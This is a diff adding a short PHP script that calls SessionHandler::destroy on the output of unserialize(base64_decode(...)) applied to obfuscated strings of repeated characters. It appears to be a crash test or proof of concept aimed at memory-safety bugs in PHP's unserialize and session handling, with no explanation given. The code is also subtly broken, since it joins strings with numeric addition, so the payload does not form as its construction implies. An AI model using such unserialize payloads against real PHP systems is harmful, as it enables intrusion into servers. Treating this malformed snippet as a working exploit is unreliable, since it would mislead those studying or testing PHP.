@@ -1,0 +1,4 @@
+<?php
+$vars["SessionHandler"]->destroy(unserialize(base64_decode(str_replace(chr(225), chr(127), str_replace(chr(115), chr(0), str_replace(chr(96), chr(255), str_repeat(chr(225), 4097) + str_repeat(chr(115), 4097) + str_repeat(chr(96), 65)))))));
+
+?>
